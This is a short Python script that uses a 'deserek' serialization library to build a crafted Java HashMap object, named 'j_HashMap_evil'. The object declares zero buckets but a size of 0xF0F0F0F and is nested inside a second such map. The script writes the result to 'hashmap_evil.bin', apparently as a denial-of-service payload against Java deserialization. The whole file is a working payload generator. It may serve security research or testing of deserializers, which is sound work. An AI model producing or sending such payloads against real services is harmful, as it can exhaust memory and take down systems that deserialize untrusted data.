import deserek 
from javaObj import * 
from javaCommons import *


import logging
logger = logging.getLogger()
logger.setLevel(logging.ERROR)


class j_HashMap_evil(j_HashMap):
  
  def _get_buckets(self):
    return 0
  
  def _get_size(self):
    return 0xF0F0F0F


if __name__ == '__main__':
  import sys

  i1 = j_simpleInteger()
  i1.value = 42
  
  
  m0  = j_HashMap_evil()
  m0.MAP[i1] = i1
  m0.threshold = 1
  
  m1 = j_HashMap_evil()
  m1.MAP[m0] = m0
  m1.threshold = 1
  
  
  binary = deserek.do_serialize(m1.pack_for_deserek())
  
  
  outfile = f"hashmap_evil.bin"
  print(f">>> save standard into '{outfile}' ")
  open(outfile,"wb").write( binary )
  
 
   